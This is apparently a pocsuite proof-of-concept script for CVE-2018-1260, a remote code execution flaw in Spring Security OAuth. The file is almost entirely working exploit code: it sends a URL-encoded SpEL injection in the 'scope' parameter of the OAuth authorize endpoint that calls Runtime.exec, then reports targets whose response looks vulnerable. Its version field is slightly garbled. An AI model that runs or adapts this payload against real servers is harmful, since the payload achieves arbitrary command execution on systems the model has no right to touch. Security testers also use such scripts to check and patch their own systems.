#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
headers = {'user-agent': 'ceshi/0.0.1','content-type': 'text/xml'}
poc_str = '''oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.github.com/chybeta&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D'''
def poc(url):
    if not url.startswith("http"):
            url = "http://" + url
    if "/" in url:
            url += poc_str
    try:
        res = req.get(url, verify=False, timeout=5, headers=headers)
        response = res.text
    except Exception:
        response = ""
    return response

class TestPOC(POCBase):
    name = 'spring_security_oauth_RCE-2018-1260'
    vulID = 'CVE-2018-1260'  #https://www.seebug.org/vuldb/ssvid-97287
    author = ['debug']
    vulType = 'RCE'    
    version = '1.0'    # default version: 1.0
    references = ['https://www.codercto.com/a/20129.html']
    desc = '''
		   Spring Security OAuth，2.3.3之前的2.3版和2.2.2之前的2.2和2.1.2之前的2.1和2.0.15之前的2.0以及较旧的
           不受支持的版本包含一个远程代码执行漏洞。恶意用户或攻击者可以向授权端点提出授权请求，
           当资源所有者转发到批准端点时，授权请求可能导致远程执行代码。
		   '''
    vulDate = '2020-02-10'
    createDate = '2020-02-10'
    updateDate = '2020-02-13'
    appName = 'Spring Security OAuth'
    appVersion = '2.3 to 2.3.3,2.2 to 2.2.2,2.0 to 2.0.152.1 to 2.1.2'
    appPowerLink = ''
    samples = ['']
    
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        response = poc(self.url)
        if 'Login with Username and Password' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+ 'Spring Security Oauth_RCE-2018-1260' + ' is exist!'
        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
register(TestPOC)
